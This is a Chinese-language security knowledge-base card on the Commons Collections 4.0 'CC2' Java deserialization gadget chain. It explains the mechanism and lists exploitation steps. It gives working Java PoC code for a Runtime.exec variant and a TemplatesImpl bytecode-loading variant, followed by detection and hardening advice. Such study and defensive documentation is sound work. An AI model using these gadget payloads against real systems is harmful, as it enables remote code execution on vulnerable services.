---
id: web-java-deser-commonscollections-cc2-chained-invoker-priorityqueue
title: Commons Collections 4.0 CC2 链：PriorityQueue → TransformingComparator → ChainedTransformer/InvokerTransformer 反射执行 Runtime.exec 或 TemplatesImpl
type: scenario
domain: web
path: web/java/deserialization/comparator
technique: cc2-priorityqueue-transformingcomparator-invokertransformer
aliases:
- CC2 利用链
- CommonsCollections2
- TransformingComparator compare
- PriorityQueue heapify
- InvokerTransformer 反射 Runtime.exec
- ChainedTransformer 假 transformer
- CC2 TemplatesImpl
tags:
- java
- deserialization
- gadget
- commons-collections4
- cc2
- priorityqueue
- transformingcomparator
- invokertransformer
- templatesimpl
cve: []
severity: high
confidence: high
status: draft
affected_versions: Commons Collections 4.0（原文环境 JDK 8u71；原文明确 JDK 版本不影响该链）
created: '2026-11-07'
updated: '2026-11-07'
---

## 一句话结论

Commons Collections 4.0 的 `TransformingComparator.compare()` 会先对两个比较参数调用 `transformer.transform()`；把它作为 `PriorityQueue` 的 comparator，反序列化时 `PriorityQueue.readObject() → heapify() → siftDown() → siftDownUsingComparator() → compare()` 就会触发 transform 链。用 `ChainedTransformer` 串联 `ConstantTransformer(Runtime.class)` 与 `InvokerTransformer`（getMethod→getRuntime→invoke→exec）可反射执行命令；把 comparator 换成 `InvokerTransformer("newTransformer")` 则让 `TemplatesImpl` 加载恶意字节码。

## 原理

- **入口**：`PriorityQueue.readObject()` 读取 size 和元素后调用 `heapify()`。`heapify()` 从 `i=(size>>>1)-1` 向下循环，只要 `i>=0` 就调用 `siftDown(i, queue[i])`。因此 `size` 必须至少为 2，`heapify` 才会进入循环。
- **比较器分发**：`siftDown(k,x)` 在 `comparator != null` 时调用 `siftDownUsingComparator(k,x)`；后者在 `k < half`（`half=size>>>1`）时调用 `comparator.compare(x, queue[child])`。`k` 来自 `heapify` 的 `i`，初始为 `(size>>>1)-1`，因此 `k<half` 成立。
- **TransformingComparator**：`compare(obj1,obj2)` 执行 `this.transformer.transform(obj1)` 和 `this.transformer.transform(obj2)`，再交给 decorated comparator 比较。transformer 字段完全由攻击者控制，`obj1/obj2` 来自队列元素；因此反序列化时 transform 会被调用两次（原文 Runtime.exec payload 会弹两次计算器）。
- **ChainedTransformer**：按数组顺序调用每个 Transformer，前一个的输出作为后一个的输入。第一个用 `ConstantTransformer(Runtime.class)` 忽略输入返回 `Runtime.class`，所以 `compare(null,null)`/队列元素是什么都不影响；随后 `InvokerTransformer("getMethod", {String.class,Class[].class}, {"getRuntime", new Class[0]})` 取 `Runtime.getRuntime`，`InvokerTransformer("invoke", {Object.class,Object[].class}, {Runtime.class,new Object[0]})` 调用得到 Runtime 实例，最后 `InvokerTransformer("exec", {String.class}, {"calc.exe"})` 执行命令。
- **为什么 add 阶段会提前触发**：`PriorityQueue.add()` 调用 `offer()`；`offer()` 在 `i=size` 非 0 时调用 `siftUp(i,e)` → `siftUpUsingComparator(k,x)` → `comparator.compare(x,e)`。如果此时 ChainedTransformer 已装好真实链，`queue.add(1)` 当场就会执行命令。解决办法与 CC6 相同：先用 `new ConstantTransformer(1)` 构造一个无害的 `ChainedTransformer` 给 comparator，`add` 两次把 size 加到 2，再用反射把 `ChainedTransformer.iTransformers` 改回真实链。
- **TemplatesImpl 变体**：不构造 ChainedTransformer，直接把 `InvokerTransformer("newTransformer", new Class[0], new Object[0])` 作为 comparator 的 transformer；反序列化时 `compare` 对队列元素调用 `transform`，即 `Impl.newTransformer()`，进入 `TemplatesImpl.getTransletInstance() → defineTransletClasses() → defineClass()` 加载 `_bytecodes`。需要反射设置 `TemplatesImpl._name`、`_bytecodes`、`_tfactory`，并把 `_class` 置 null；恶意类需继承 `AbstractTranslet`。
- **TemplatesImpl 变体的 add 规避**：`queue.add(1)` 时传入的是 Integer，`compare` 会对 Integer 调用 `transform`，因此初始 `InvokerTransformer` 的方法名要选一个 Integer 上无参、无副作用的方法（原文用 `toString`），add 完成后再反射把 `iMethodName` 改成 `newTransformer`；同时反射把 `queue[0]=TemplatesImpl`、`queue[1]=1`，保证反序列化时 `compare` 的参数是 TemplatesImpl。
- **版本**：`InvokerTransformer` 在 Commons Collections 4.0 仍实现 `Serializable`，4.1+ 移除了该能力；`TransformingComparator` 是 commons-collections4 独有类。原文环境 JDK 8u71，JDK 版本不影响该链（但 TemplatesImpl 的访问受 JDK 模块封装影响）。

## 触发条件

- 目标使用 Commons Collections 4.0（或 `InvokerTransformer` 可序列化的 4.x 版本），且存在 Java 原生反序列化入口，未过滤 `PriorityQueue`、`TransformingComparator`、`InvokerTransformer`。
- `PriorityQueue` 的 `initialCapacity >= 1`（否则构造器抛 `IllegalArgumentException`），反序列化时 `size >= 2`（否则 `heapify` 不进 `siftDown`），元素非 null。
- comparator 为攻击者可控的 `TransformingComparator`；其 transformer 可控。
- Runtime 变体只需要目标有 `Runtime.exec` 权限；TemplatesImpl 变体需要目标 JDK 内部 Xalan `TemplatesImpl` 可反射访问（JDK 8 常见），恶意类继承 `AbstractTranslet`。
- 仅用于授权测试/CTF；不要在未授权环境执行命令。

## 利用步骤

1. 构造真实 transform 链：`ConstantTransformer(Runtime.class)` → `InvokerTransformer("getMethod",...)` → `InvokerTransformer("invoke",...)` → `InvokerTransformer("exec",...)`，外层再放一个无害的 `ConstantTransformer(1)` 收尾。
2. 先用 `new ConstantTransformer(1)` 构造假 `ChainedTransformer`，包进 `TransformingComparator`；创建 `PriorityQueue(2, comparator)`，`add(1)` 两次把 `size` 变成 2，避免 add 阶段触发。
3. 反射取 `ChainedTransformer.iTransformers`，`setAccessible(true)` 后把真实链写回。
4. 序列化 `PriorityQueue`，通过目标反序列化入口发送；`readObject → heapify → siftDown → siftDownUsingComparator → compare → ChainedTransformer.transform` 触发 `Runtime.exec`（compare 调用两次 transform，命令执行两次）。
5. TemplatesImpl 变体：构造 `TemplatesImpl` 并设置 `_name`、`_bytecodes`、`_tfactory`、`_class=null`；用 `InvokerTransformer("toString", new Class[0], new Object[0])` 作为 comparator 的 transformer；`PriorityQueue(2, comparator)` 后 `add(1)` 两次；反射把 `iMethodName` 改为 `newTransformer`；反射把 queue 数组设为 `{Impl, 1}`。
6. 序列化 TemplatesImpl 变体；反序列化时 `compare` 对 `Impl` 调用 `newTransformer()`，加载 `_bytecodes` 中的类并执行静态初始化。
7. 用本地 `calc.exe`/无害命令验证链路，再按授权范围替换为实际命令；记录序列化字节与反序列化入口。

## PoC

Runtime.exec 变体（按原文最终 POC 简化，省略文件路径与异常处理）：

```java
Transformer[] faketransformers = new Transformer[]{new ConstantTransformer(1)};
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
        new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
        new Object[]{Runtime.class, new Object[0]}),
    new InvokerTransformer("exec", new Class[]{String.class},
        new Object[]{"calc.exe"}),
    new ConstantTransformer(1)
};

ChainedTransformer chain = new ChainedTransformer(faketransformers);
TransformingComparator comparator = new TransformingComparator(chain);
PriorityQueue queue = new PriorityQueue(2, comparator);
queue.add(1);
queue.add(1);

Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
f.setAccessible(true);
f.set(chain, transformers);

serialize(queue);
unserialize();
```

完整调用链：

```text
ObjectInputStream.readObject()
  PriorityQueue.readObject()
    PriorityQueue.heapify()
      PriorityQueue.siftDown()
        PriorityQueue.siftDownUsingComparator()
          TransformingComparator.compare()
            ChainedTransformer.transform()
              ConstantTransformer.transform()      -> Runtime.class
              InvokerTransformer.transform()       -> getMethod("getRuntime")
              InvokerTransformer.transform()       -> invoke(Runtime.class, [])
              InvokerTransformer.transform()       -> exec("calc.exe")
```

TemplatesImpl 变体（关键代码，恶意字节码由 Evil.class 读取）：

```java
TemplatesImpl impl = new TemplatesImpl();
setField(impl, "_name", "demo");
setField(impl, "_class", null);
setField(impl, "_bytecodes", new byte[][]{evilBytes});
setField(impl, "_tfactory", new TransformerFactoryImpl());

InvokerTransformer it = new InvokerTransformer("toString", new Class[0], new Object[0]);
TransformingComparator comparator = new TransformingComparator(it);
PriorityQueue queue = new PriorityQueue(2, comparator);
queue.add(1);
queue.add(1);

setField(it, "iMethodName", "newTransformer");
Object[] arr = (Object[]) getField(queue, "queue");
arr[0] = impl;
arr[1] = 1;

serialize(queue);
unserialize();
```

```text
ObjectInputStream.readObject()
  PriorityQueue.readObject()
    PriorityQueue.heapify()
      PriorityQueue.siftDownUsingComparator()
        TransformingComparator.compare()
          InvokerTransformer.transform()          -> impl.newTransformer()
            TemplatesImpl.getTransletInstance()
              TemplatesImpl.defineTransletClasses()
                TemplatesImpl.defineClass()       -> 加载 _bytecodes
```

恶意类需继承 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`，在静态初始化块中执行命令，并实现两个 `transform` 方法。

## 变体与关联

- **TemplatesImpl 变体的其他构造**：[[web-java-deser-commonscollections-cc4-priorityqueue-templatesimpl]] 使用 CC4 的 `ConstantTransformer(TrAXFilter.class)` + `InstantiateTransformer(Templates, templates)` 触发 `TemplatesImpl`，并把 CC2 作为“去掉 ChainedTransformer、InstantiateTransformer 直接作 comparator”的变体；本条则是 ysoserial CommonsCollections2 的 `ChainedTransformer`/`InvokerTransformer` 构造，PoC 与反射字段不同。
- **其他 Transformer 组合**：`TransformingComparator` 可接任意可序列化 Transformer；`InvokerTransformer` 也可换成 `InstantiateTransformer`、`TrAXFilter` 等，形成 CC4/CC2 交叉变体。
- **入口变体**：除 `PriorityQueue` 外，`TreeMap`/`TreeSet` 等依赖比较器的反序列化入口也可触发 `TransformingComparator.compare`。
- **关联**：[[web-java-deser-commonscollections-cc1-transformedmap]]、[[web-java-deser-commonscollections-cc1-lazymap-proxy]]、[[web-java-deser-commonscollections-cc5-badattribute-tostring]]、[[web-java-deser-commonscollections-cc6-cc3-templatesimpl]]、[[web-java-deser-commonscollections-cc7-hashtable-equals-lazymap]]。
- **边界**：CC 4.1+ 的 `InvokerTransformer` 不可序列化，本链需换 gadget；JDK 17+ 内部 Xalan 被模块封装，TemplatesImpl 变体需外部 Xalan 或其它 sink；JEP 290 过滤 `PriorityQueue`/`TemplatesImpl` 时失效。

## 检测与防御

- **检测**：序列化流中出现 `PriorityQueue` + `TransformingComparator` + `ChainedTransformer`/`InvokerTransformer`/`TemplatesImpl`；反序列化后加载未知类、执行 `Runtime.exec`；`PriorityQueue` 的 `size` 与 `queue` 数组被反射改写等异常对象图。
- **修复/加固**：升级 Commons Collections 到 4.1+ 并移除可序列化 Transformer gadget；消除不可信 Java 原生反序列化；使用 JEP 290 `ObjectInputFilter` 白名单，拒绝 `PriorityQueue`、`TransformingComparator`、`InvokerTransformer`、`TemplatesImpl` 等非业务类；升级 JDK 并限制内部 Xalan 访问；对反序列化入口做签名/加密与来源校验。
- **测试注意**：PoC 会执行命令，仅在授权/隔离环境使用；TemplatesImpl 变体需先生成合法 `AbstractTranslet` 字节码，避免用未知样本。
